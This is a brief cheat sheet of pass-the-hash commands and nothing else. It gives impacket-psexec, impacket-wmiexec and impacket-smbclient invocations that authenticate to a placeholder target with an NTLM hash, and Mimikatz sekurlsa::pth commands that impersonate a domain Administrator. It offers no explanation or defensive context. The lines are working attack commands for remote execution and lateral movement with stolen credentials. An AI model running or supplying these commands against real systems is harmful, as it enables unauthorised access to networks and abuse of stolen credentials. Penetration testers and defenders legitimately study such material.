# PsExec
```
impacket-psexec 'domain.local/user@<TARGET_IP>' -hashes ':<NTLM_HASH>'
```
# WMI
```
impacket-wmiexec 'domain.local/user@<TARGET_IP>' -hashes ':<NTLM_HASH>'
```
# SMB client
```
impacket-smbclient 'domain.local/user@<TARGET_IP>' -hashes ':<NTLM_HASH>'
```
### **Windows — Mimikatz**
```
privilege::debug
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<NTLM_HASH>
```